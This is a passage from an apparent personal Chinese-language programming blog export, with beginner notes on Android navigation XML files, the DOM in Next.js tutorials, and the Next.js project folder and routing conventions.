<li><code>LoginResult.java</code>：主要用于封装登录操作的结果。</li>
<li><code>LoginViewModel.java</code></li>
<li><code>LoginViewModelFactory.java</code>：创建并返回一个特定的ViewModel。</li>
</ol>
<p>  总共六个文件。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓 XML 文件 分析</title>
    <url>/2023/08/28/2023-8-28-Android%20XML%20File%20Analysis/</url>
    <content><![CDATA[<h1 id="安卓-XML-文件-分析"><a href="#安卓-XML-文件-分析" class="headerlink" title="安卓 XML 文件 分析"></a>安卓 XML 文件 分析</h1><p>本文以深度分析安卓的XML文件为主，了解XML文件的作用，以便于更好的理解开发的各个概念。</p>
<p>学而不思则罔，思而不学则殆。</p>
<p>要学习，先思考。</p>
<p>首先定义三个问题：</p>
<ol>
<li>为什么要用到XML？</li>
<li>XML文件是如何被引用的？</li>
<li>XML的各个元素在java文件中又是如何表示的？</li>
</ol>
<h2 id="问题解答环节-（一）"><a href="#问题解答环节-（一）" class="headerlink" title="问题解答环节 （一）"></a>问题解答环节 （一）</h2><h3 id="问题一：为什么要用到XML？"><a href="#问题一：为什么要用到XML？" class="headerlink" title="问题一：为什么要用到XML？"></a>问题一：为什么要用到XML？</h3><p>答：主要出于以下几个原因</p>
<ul>
<li><p>方便定义用户界面</p>
<ul>
<li>XML非常的适合描述界面的视图元素，这使得开发人员能够以声明的形式定义界面元素，而不必在代码中直接构建和布局。</li>
</ul>
</li>
<li><p>方便逻辑与布局分离</p>
<ul>
<li>XML文件描绘布局，java或kotlin文件实现逻辑，就这么简单。</li>
</ul>
</li>
<li><p>代码简化</p>
<ul>
<li>代码分开写，看起来更简单。</li>
</ul>
</li>
<li><p>支持可扩展性</p>
<ul>
<li>XML被设计为可扩展的标记语言</li>
</ul>
</li>
<li><p>与安卓API集成</p>
<ul>
<li>可以通过使用XML布局文件和Android的API，开发人员可以轻松地创建动态的用户界面，响应用户的操作。（似懂非懂）</li>
</ul>
</li>
</ul>
<h3 id="问题二：XML代码是如何被引用的？"><a href="#问题二：XML代码是如何被引用的？" class="headerlink" title="问题二：XML代码是如何被引用的？"></a>问题二：XML代码是如何被引用的？</h3><p>首先，看代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.demoproject1.databinding.FragmentFirstBinding;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> androidx.annotation.NonNull;</span><br><span class="line"><span class="keyword">import</span> androidx.fragment.app.Fragment;</span><br><span class="line"><span class="keyword">import</span> androidx.navigation.fragment.NavHostFragment;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onViewCreated</span><span class="params">(<span class="meta">@NonNull</span> View view, Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现xml导航</span></span><br><span class="line">        <span class="built_in">super</span>.onViewCreated(view, savedInstanceState);</span><br><span class="line"></span><br><span class="line">        binding.buttonFirst.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                NavHostFragment.findNavController(FirstFragment.<span class="built_in">this</span>)</span><br><span class="line">                        .navigate(R.id.action_FirstFragment_to_SecondFragment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上图代码中 <code>R.id.action_FirstFragment_to_SecondFragment</code> 这行代码，可以直接访问到<code>nav_graph.xml</code></p>
<p>文件。</p>
<p>实质: <code>action</code>  作用: First Fragment to Second Fragment</p>
<p>解释: 将 第一片 Fragment导航到了 第二片 Fragment</p>
<p>通过<code>NavHostFragment.findNavController()</code>这个方法,实现了Fragment之间的导航管理.</p>
<p>看到这里,还没明白?没关系,来看看<code>nav_graph.xml</code>这个文件的内容.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">navigation</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/nav_graph&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:startDestination</span>=<span class="string">&quot;@id/FirstFragment&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">fragment</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/FirstFragment&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.example.demoproject1.FirstFragment&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/first_fragment_label&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:layout</span>=<span class="string">&quot;@layout/fragment_first&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/action_FirstFragment_to_SecondFragment&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">app:destination</span>=<span class="string">&quot;@id/SecondFragment&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">fragment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fragment</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/SecondFragment&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.example.demoproject1.SecondFragment&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/second_fragment_label&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:layout</span>=<span class="string">&quot;@layout/fragment_second&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/action_SecondFragment_to_FirstFragment&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">app:destination</span>=<span class="string">&quot;@id/FirstFragment&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--我们可以看到这里有一个action标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">fragment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也就是说,我们通过 <code>R.id</code>可以直接引用到此<code>id</code>,访问到其下的<code>action_SecondFragment_to_FirstFragment</code>这段内容,也就没有那么难理解了吧.</p>
<p>而<code>NavHostFragment</code>的<code>findNavController</code>方法,直译为<strong>寻找导航控制器</strong>.</p>
<p>实际上是在告诉系统：“请在 <code>FirstFragment</code> 的上下文中找到与之关联的 <code>NavController</code>”。通过传入 <code>FirstFragment.this</code> 作为参数，为系统提供了找到正确 <code>NavController</code> 的必要上下文信息。</p>
<p>navigate的本质:<code>navigate()</code>方法是Android Navigation组件中的一个方法，用于执行导航动作。该方法接受一个导航动作的ID作为参数，并触发与该动作关联的导航。</p>
<p>而在XML文件中 <code>app:destination=&quot;@id/FirstFragment&quot; </code>这行代码的作用不可小觑.</p>
<p>上文很重要的一句话是: <strong>并出发与该动作关联的导航</strong>.</p>
<p>而<code>app:destination=&quot;@id/FirstFragment&quot; </code>,所提供的,就是关联!</p>
<ul>
<li><p>在导航XML中，<code>app:destination=&quot;@id/FirstFragment&quot;</code>的作用是指定一个目标页面的标识符，该标识符与FirstFragment类相关联。</p>
<p>具体来说，<code>@id/FirstFragment</code>是一个资源标识符，它指定了目标页面的名称。在这种情况下，目标页面被指定为FirstFragment类，这意味着当应用程序需要跳转到FirstFragment时，可以参考这个标识符来找到正确的目标页面。</p>
</li>
</ul>
<p><code>fragment_first.xml </code>中的代码:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.FirstFragment&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/textview_first&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;@string/hello_first_fragment&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">&quot;@id/button_first&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_first&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;@string/next&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">&quot;@id/textview_first&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>总结:</p>
<ul>
<li>理解了XML文件</li>
<li><code>findNavController()</code>方法</li>
<li><code>navigate()</code>方法</li>
<li><code>R.id</code>印象加深</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title>Next学习手册（一）DOM</title>
    <url>/2023/09/25/2023-9-25-Next%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%80%EF%BC%89-%20DOM/</url>
    <content><![CDATA[<h3 id="React工作原理"><a href="#React工作原理" class="headerlink" title="React工作原理"></a>React工作原理</h3><p>当浏览器试图访问一个网页时，会得到诸如下图一样的响应内容：</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/html-to-dom.png" class="">

<p>然后浏览器将通过此响应内容，构造 DOM (文档对象模型)。</p>
<p>然后才是我们所看到的UI界面。</p>
<h3 id="什么是DOM"><a href="#什么是DOM" class="headerlink" title="什么是DOM?"></a>什么是DOM?</h3><p>对于什么是DOM，<code>Next.js</code> 官方给出了如下解释。</p>
<p>The DOM is an object representation of the HTML elements. It acts as a  bridge between your code and the user interface, and has a tree-like  structure with parent and child relationships.</p>
<p>翻译：DOM是HTML元素的对象表示。它充当代码和用户界面之间的桥梁，并具有具有父子关系的树状结构。</p>
<p>这意味着我们可以通过DOM界面以及程序来监听用户事件，并通过修改元素来操作DOM。</p>
<h4 id="示例一："><a href="#示例一：" class="headerlink" title="示例一："></a>示例一：</h4><p>  假设我们有一个HTML文件，内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个HTML中，我们给<code>&lt;div&gt;</code>加了一个唯一的id，为了方便针对。并且为了在HTML中编写javascript代码，添加了标记。</p>
<p>现在通过一个DOM方法，<code>getElementByID()</code>来根据<code>id</code>选择<code>&lt;div&gt;</code>标签。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后继续使用DOM方法创建一个新的元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 根据id 选择div标签</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 声明一个新的 h1 元素</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> header = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;h1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 声明新的文本内容</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> headerContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Develop. Preview. Ship. 🚀&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 将刚才声明的文本内容添加给 h1 元素</span></span></span><br><span class="line"><span class="language-javascript">      header.<span class="title function_">appendChild</span>(headerContent);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 将刚才声明的 h1 元素 放置在 div中</span></span></span><br><span class="line"><span class="language-javascript">      app.<span class="title function_">appendChild</span>(header);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着我们可以看到如下页面：</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/page_image_1.png" class="">

<h3 id="HTML-AND-DOM"><a href="#HTML-AND-DOM" class="headerlink" title="HTML AND DOM"></a>HTML AND DOM</h3><p>通过查看页面DOM元素，我们会看到页面中包含<code>&lt;h1&gt;</code>元素，这与我们的源代码不同。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/source-code.png" class="">

<p>原因就是，HTML表示的是初始页面内容，而DOM表示修改后的页面内容。之所以呈现不同，就是因为我们看到的页面已经被编写的javascript 代码修改过了。</p>
<p>使用简单的javascript代码来更新DOM非常强大，但代码很冗长。我们使用了如下7行代码来更新了一个<code>&lt;h1&gt;</code>元素及其内容。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> header = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;h1&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> headerContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&#x27;Develop. Preview. Ship. 🚀&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  header.<span class="title function_">appendChild</span>(headerContent);</span></span><br><span class="line"><span class="language-javascript">  app.<span class="title function_">appendChild</span>(header);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>随着应用体积增长，使用这种方法编写应用会越来越难。但开发者通过编写指令，描述想现实的内容，让计算机知道该如何更新DOM，这是很不错的。</p>
<h3 id="命令式编程和声明式编程"><a href="#命令式编程和声明式编程" class="headerlink" title="命令式编程和声明式编程"></a>命令式编程和声明式编程</h3><p>上面的代码是命令式编程的例子，我们编写如何更新用户界面的步骤。但涉及到构建用户界面时，声明式编程是首选的，因为这可以加快开发过程。</p>
<p>In other words, <strong>imperative programming</strong> is like giving a chef step-by-step instructions on how to make a pizza. <strong>Declarative programming</strong> is like ordering a pizza without being concerned about the steps it takes to make the pizza. 🍕	— Next.js</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>Next.js目录文件</title>
    <url>/2023/09/25/2023-9-25-Next-js%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="What-is-Next-js"><a href="#What-is-Next-js" class="headerlink" title="What is Next.js ?"></a>What is Next.js ?</h2><p>Next.js is React framework for building full-stack web applications.</p>
<p> 翻译：Next.js是用于构建全栈web应用程序的React框架。 </p>
<h2 id="Main-Features"><a href="#Main-Features" class="headerlink" title="Main Features"></a>Main Features</h2><p>Some of the main Next.js features include:</p>
<ul>
<li>Routing 		也就是路由</li>
<li>Rendering             渲染</li>
<li>Data Fetching       数据获取</li>
<li>Styling                    样式</li>
<li>Optimizations       优化</li>
<li>TypeScript              支持TypeScript</li>
</ul>
<h2 id="App-Router-Pages-Router"><a href="#App-Router-Pages-Router" class="headerlink" title="App Router &amp;&amp; Pages Router"></a>App Router &amp;&amp; Pages Router</h2><p>Best newer is App Router, that allows use React’s latest features, such as Server Components and Streaming. </p>
<p>Older is Pages Router, that is the original Next.js router, which allowed you to build server-rendered React applications and continues to be supported for older Next.js applications. </p>
<p>两种路由方式，最新的 App路由，旧的是Pages路由，但仍然支持。</p>
<h2 id="Automatic-Installation"><a href="#Automatic-Installation" class="headerlink" title="Automatic Installation"></a>Automatic Installation</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx create-next-app@latest</span><br></pre></td></tr></table></figure>

<p>为什么只有自动安装？哦，手动安装暂时懒得学。</p>
<h2 id="Project-Structure"><a href="#Project-Structure" class="headerlink" title="Project Structure"></a>Project Structure</h2><h3 id="In-Top-level-Folders"><a href="#In-Top-level-Folders" class="headerlink" title="In Top-level Folders"></a>In Top-level Folders</h3><p>Look:
     - app <code>App Router</code> 
     - pages <code>Pages Router</code> 
     - public <code>Static assets to be served</code>
     - src <code>Optional application source folder </code></p>
<h3 id="Top-level-files"><a href="#Top-level-files" class="headerlink" title="Top-level files"></a>Top-level files</h3><hr>
<p>Next.js</p>
<hr>
<p><code>next.config.js</code> Next.js 的配置文件</p>
<p><code>package.json</code> 项目依赖项和脚本(scripts)</p>
<p><code>instrumentation.ts</code> 遥测框架配置文件</p>
<p><code>middleware.ts</code>Next.js 请求的中间件</p>
<p><code>.env</code> Environment variables 也就是环境变量</p>
<p><code>.env.production</code>production 的环境变量</p>
<p><code>.env.development</code>Development 的环境变量</p>
<hr>
<p>Tip: Development 意为开发，production 意为生产</p>
<ul>
<li>在开发时使用<code> .env.development</code>,而在实际的生产环境时应该用<code>.env.production</code></li>
</ul>
<hr>
<p><code>.eslintrc.json</code> ESLint的配置文件</p>
<hr>
<p>Tip: ESLint是一个用于识别ECMAScript并按照规则给出报告的代码检测工具，它可以用来避免低级错误和统一代码的风格</p>
<hr>
<p><code>.gitignore</code> Git文件及其文件夹（可忽略）</p>
<p><code>next0env.d.ts</code>Next.js 使用TypeScript 的声明文件</p>
<p><code>tsconfig.json</code> TypeScript 的配置文件</p>
<p><code>jsconfig.json</code> JavaScript 的配置文件</p>
<p><code>postcss.config.js</code>Tailwind CSS的配置文件</p>
<hr>
<p>Tip: Tailwind CSS是一个利用公用程序类(Utilize Class)的CSS框架。它是一个可定制化的、功能类优先的CSS框架，和我们知道的UI框架差不多。</p>
<hr>
<h2 id="app-Routing-Conventions"><a href="#app-Routing-Conventions" class="headerlink" title="app Routing Conventions"></a><code>app</code> Routing Conventions</h2><h2 id="RoutingFiles"><a href="#RoutingFiles" class="headerlink" title="RoutingFiles"></a>RoutingFiles</h2><p><code>layout</code> 	<code>.js</code> <code>.jsx</code>  <code>.tsx</code>    布局</p>
<p><code>page</code> 	<code>.js</code> <code>.jsx</code>  <code>.tsx</code> 	页面</p>
<p><code>loading</code> 	<code>.js</code> <code>.jsx</code>  <code>.tsx</code>	等待中的UI</p>
<p><code>not-found</code>	<code>.js</code> <code>.jsx</code>  <code>.tsx</code>	没搜索到的UI</p>
<p><code>error</code>		<code>.js</code> <code>.jsx</code>  <code>.tsx</code>	错误的UI</p>
<p><code>golobal-error</code>	<code>.js</code> <code>.jsx</code>  <code>.tsx</code>	全局错误的UI</p>
<p><code>route</code>	<code>.js</code> <code>.ts</code>	API endpoint</p>
<p><code>template</code>	<code>.js</code> <code>.jsx</code>  <code>.tsx</code>	重新渲染的布局</p>
<p><code>default</code>	 <code>.js</code> <code>.jsx</code>  <code>.tsx</code>	</p>
<h2 id="Nested-Routes"><a href="#Nested-Routes" class="headerlink" title="Nested Routes"></a>Nested Routes</h2><p>嵌套路由</p>
<p><code>folder</code> 	路由段</p>
<p><code>folder/folder</code> 嵌套路由段</p>
<h2 id="Dynamic-Routes"><a href="#Dynamic-Routes" class="headerlink" title="Dynamic Routes"></a>Dynamic Routes</h2><p>动态路由</p>
<p><code>[folder]</code>	动态路由线</p>
<p><code>[...folder] </code> 	捕获全部路由段</p>
<p><code>[[...folder]]</code>	可选捕获全部路由段</p>
<h2 id="Route-Groups-and-Private-Folders"><a href="#Route-Groups-and-Private-Folders" class="headerlink" title="Route Groups and Private Folders"></a>Route Groups and Private Folders</h2><p><code>(folder)</code>	分组路由而不影响路由</p>
<p><code>_folder</code>	 选择文件夹和所有子段退出路由 </p>
<h2 id="Parallel-and-Intercepted-Routes"><a href="#Parallel-and-Intercepted-Routes" class="headerlink" title="Parallel and Intercepted Routes"></a>Parallel and Intercepted Routes</h2><p><code>@folder</code>	命名插槽 Named slot</p>
<p><code>(.)folder</code>	拦截同一级别</p>
<p><code>(..)folder</code>	拦截一级以上</p>
<p><code>(..)(..)folder</code>	拦截两级以上</p>
<p><code>(...)folder</code>	从根目录开始拦截</p>
<h2 id="App-Icons"><a href="#App-Icons" class="headerlink" title="App Icons"></a>App Icons</h2><p><code>favicon</code>	<code>.ico</code>	Favicon 文件</p>
<p><code>icon</code>	<code>.ico</code> <code>.jpg</code> <code>.jpeg</code> <code>.png</code> <code>.svg</code>	App图标文件</p>
<p><code>icon</code>	<code>.js</code>  <code>.ts</code> <code>.tsx</code>	生成的应用程序图标</p>
<p><code>apple-icon</code>	<code>.jpg</code> <code>jpeg</code> <code>.png</code>	App应用程序图标文件</p>
<p><code>apple-icon</code>	<code>.js</code> <code>.ts</code> <code>.tsx</code>	生成的App应用程序图标</p>
<h2 id="Open-Graph-and-Twitter-Image"><a href="#Open-Graph-and-Twitter-Image" class="headerlink" title="Open Graph and Twitter Image"></a>Open Graph and Twitter Image</h2><p><code>opengraph-image</code>	<code>.jpg</code> <code>.jpeg</code> <code>.png</code> <code>.gif</code>	打开图像文件</p>
<p><code>opengraph-image</code>	<code>.js</code> <code>.ts</code> <code>.tsx</code>	生成打开的图像文件</p>
<p><code>twitter-image</code>	<code>.jpg</code> <code>.jpeg</code> <code>.png</code> <code>.gif</code>	打开推特图像文件</p>
<p><code>twitter-image</code>	<code>.js</code> <code>.ts</code> <code>.tsx</code>	生成打开的推特图像文件</p>
<h2 id="SEO"><a href="#SEO" class="headerlink" title="SEO"></a>SEO</h2><p><code>sitemap</code>	<code>.xml</code>	站点地图文件</p>
<p><code>sitemap</code>	<code>.js</code> <code>.ts</code>	生成站点地图</p>
<p><code>robots</code>	<code>.txt</code>	爬虫协议文件</p>
<p><code>robots</code>	<code>.js</code> <code>.ts</code>	生成爬虫协议文件</p>
<h2 id="pages-Routing-Conventions"><a href="#pages-Routing-Conventions" class="headerlink" title="pages Routing Conventions"></a><code>pages</code> Routing Conventions</h2><p><code>_app</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code>	自定义app</p>
<p><code>_document</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	自定义Doc</p>
<p><code>_error</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	自定义错误页面</p>
<p><code>404</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	404 错误页面</p>
<p><code>500</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	500 错误页面</p>
<h2 id="Routes"><a href="#Routes" class="headerlink" title="Routes"></a>Routes</h2><h3 id="Folder-convention"><a href="#Folder-convention" class="headerlink" title="Folder convention"></a>Folder convention</h3><p><code>index</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	主页</p>
<p><code>folder/index</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	嵌套页面</p>
<h3 id="File-convention"><a href="#File-convention" class="headerlink" title="File convention"></a>File convention</h3><p><code>index</code> 	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	主页</p>
<p><code>file</code>	<code>.js</code> <code>.jsx</code> <code>.tsx</code> 	嵌套页面</p>
